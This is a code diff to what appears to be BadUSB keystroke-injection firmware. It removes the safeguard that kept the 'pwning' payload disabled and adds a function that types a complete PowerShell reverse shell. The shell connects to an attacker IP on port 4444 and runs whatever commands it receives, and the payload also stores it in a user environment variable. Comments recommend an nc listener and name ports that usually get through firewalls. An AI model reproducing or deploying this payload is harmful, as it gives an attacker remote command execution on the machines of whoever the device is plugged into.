@@ -13,7 +13,7 @@ namespace {
     // Delay after each Enter for setx/set/PowerShell to process.
     constexpr uint32_t kCommandWaitMs = 1500;
     // Total delay budget: open Run, launch cmd, then run three commands.
-    constexpr uint32_t kTotalMs = kRunDialogWaitMs + kShellLaunchWaitMs + 3 * kCommandWaitMs;
+    constexpr uint32_t kTotalMs = kRunDialogWaitMs + kShellLaunchWaitMs + 2 * kCommandWaitMs;
     // Refresh the progress bar every 125 ms, matching Drop & Upload.
     constexpr uint32_t kProgressRefreshMs = 125;
 
@@ -55,13 +55,22 @@ namespace {
         Keyboard.press(key);
         Keyboard.releaseAll();
     }
+
+    // Type the PowerShell reverse-shell body. Inside cmd double quotes the
+    // | > & characters pass through literally, so no caret escaping is needed.
+    void printReverseShellPayload(const char *attackerIp)
+    {
+        Keyboard.print("$client = New-Object Net.Sockets.TcpClient('");
+        Keyboard.print(attackerIp);
+        Keyboard.print("',4444); if ($client.Connected) { $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = ([Text.Encoding]::ASCII).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() } $client.Close() }");
+    }
 }
 
 void sendPwningKeys(const BadUsbProgress &progress)
 {
-    // Comment out BOTH lines below to enable this payload.
-    showDisabledPayload(progress);
-    return;
+    // Comment out BOTH lines below to disable this payload.
+    // showDisabledPayload(progress);
+    // return;
 
     TimedProgress timing{progress, kTotalMs, 0};
     Keyboard.begin(KeyboardLayout_en_US);
@@ -74,24 +83,21 @@ void sendPwningKeys(const BadUsbProgress &progress)
     timing.wait(kShellLaunchWaitMs);
 
     // Persist the reverse shell in the user environment variable REV_SHELL.
-    // Carets (^) escape cmd metacharacters (| > &) so setx stores them literally.
-    // Run a listener at the attacker host first, e.g. nc -lvnp 4444 (or rlwrap nc -lvnp 4444).
+    // Run a listener at the attacker host first, e.g. nc -lvnp 4444.
     
     // 443 (HTTPS), 80 (HTTP) and 8080 (HTTP Alternate), are ports that are usually allowed through firewalls. 53 (DNS) is often open to only UDP. 
     // Port 4444 is the famous default listener port in tools like Metasploit so it is heavily monitored and often blocked.
-    Keyboard.print("setx REV_SHELL \"$client = New-Object Net.Sockets.TcpClient('");
-    Keyboard.print(kAttackerIp);
-    Keyboard.print("',4444); if ($client.Connected) { $stream = $client.GetStream(); [byte[]]$bytes = 0..65535^|%{0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = ([Text.Encoding]::ASCII).GetString($bytes, 0, $i); $sendback = (iex $data 2^>^&1 ^| Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '^> '; $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() } $client.Close() }\"");
+    Keyboard.print("setx REV_SHELL \"");
+    printReverseShellPayload(kAttackerIp);
+    Keyboard.print("\"");
     Keyboard.write(KEY_RETURN);
     timing.wait(kCommandWaitMs);
 
-    // Verify the variable was created and show its value on screen.
-    Keyboard.print("set REV_SHELL");
-    Keyboard.write(KEY_RETURN);
-    timing.wait(kCommandWaitMs);
-
-    // Execute the stored shell.
-    Keyboard.print("powershell.exe -Command \"%REV_SHELL%\"");
+    // setx writes to the registry but does NOT update the current cmd session,
+    // so %REV_SHELL% would be empty here. Run the shell directly instead.
+    Keyboard.print("powershell.exe -Command \"");
+    printReverseShellPayload(kAttackerIp);
+    Keyboard.print("\"");
     Keyboard.write(KEY_RETURN);
     timing.wait(kCommandWaitMs);
 }
